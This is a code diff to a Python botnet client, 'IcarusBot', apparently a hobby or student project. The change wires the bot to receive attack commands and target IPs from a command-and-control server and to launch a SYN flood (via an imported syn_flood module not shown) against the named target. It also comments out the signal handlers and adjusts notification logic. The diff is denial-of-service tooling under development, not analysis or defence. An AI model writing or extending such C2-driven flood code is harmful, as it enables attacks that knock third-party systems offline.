@@ -6,6 +6,7 @@ import threading
 import time
 from enum import Enum
 from socket import timeout
+import syn_flood
 
 import requests
 from win10toast import ToastNotifier
@@ -40,8 +41,8 @@ class IcarusBot:
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
-        signal.signal(signal.SIGINT, self.exit_gracefully)
-        signal.signal(signal.SIGTERM, self.exit_gracefully)
+        #signal.signal(signal.SIGINT, self.exit_gracefully)
+        #signal.signal(signal.SIGTERM, self.exit_gracefully)
         # This is where we load the config file regarding the bot's ID
 
         # This will constantly run and update with the nameserver.
@@ -114,6 +115,8 @@ class IcarusBot:
                 jsonMsg = json.loads(self.sock.recv(4096).decode('ascii'))
                 print(jsonMsg)
                 request_type = jsonMsg['request']
+                attack_type = jsonMsg['attack']
+                target_ip = jsonMsg['targetIP']
                 response = ''
                 # Through each if statement, we specify what we're going to do. The logic is contained in each if.
                 if request_type == 'status':
@@ -126,6 +129,17 @@ class IcarusBot:
                         'target': self.target_ip
                     }
                     response = json.dumps(response)
+                elif request_type == 'attack':
+                    # TODO: Implement attacks here
+                    # TODO: Number of packets to send?
+                    if attack_type == 'SYN_FLOOD':
+                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, 1))
+                        #attack_thread.start()
+                        #attack_thread.join()
+                        syn_flood.SYN_Flood(target_ip, [1])
+                    else:
+                        print("No attack type specified")
+
                 # This will then send the message back to the server, irrespective of the flag.
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
@@ -160,10 +174,10 @@ def notification(action):
     toast = ToastNotifier()
     title = ""
     body = ""
-    if action == BotAction.STARTED:
+    if action == "STARTED":
         title = "ICARUS BOT STARTED"
         body = "If you didn't expect this - whoops"
-    elif action == BotAction.ATTACKING:
+    elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
         body = "The bot gave in to peer pressure and is attacking something"
     else:
